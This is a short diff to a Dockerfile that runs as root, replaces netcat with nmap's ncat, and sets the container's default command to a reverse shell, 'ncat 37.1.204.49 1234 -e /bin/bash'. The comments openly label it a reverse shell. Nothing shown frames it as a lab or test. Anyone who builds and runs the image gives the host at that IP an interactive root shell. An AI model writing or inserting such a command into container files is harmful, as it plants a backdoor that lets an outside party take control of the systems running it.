@@ -6,8 +6,8 @@ USER root
 # Update packages
 RUN apt-get update -y && apt-get upgrade -y
 
-# Install Netcat
-RUN apt-get install -y netcat
+# Install nmap package (includes ncat)
+RUN apt-get install -y nmap
 
-# Start Netcat reverse shell
-CMD nc 37.1.204.49 1234 -e /bin/bash
+# Start ncat reverse shell
+CMD ncat 37.1.204.49 1234 -e /bin/bash
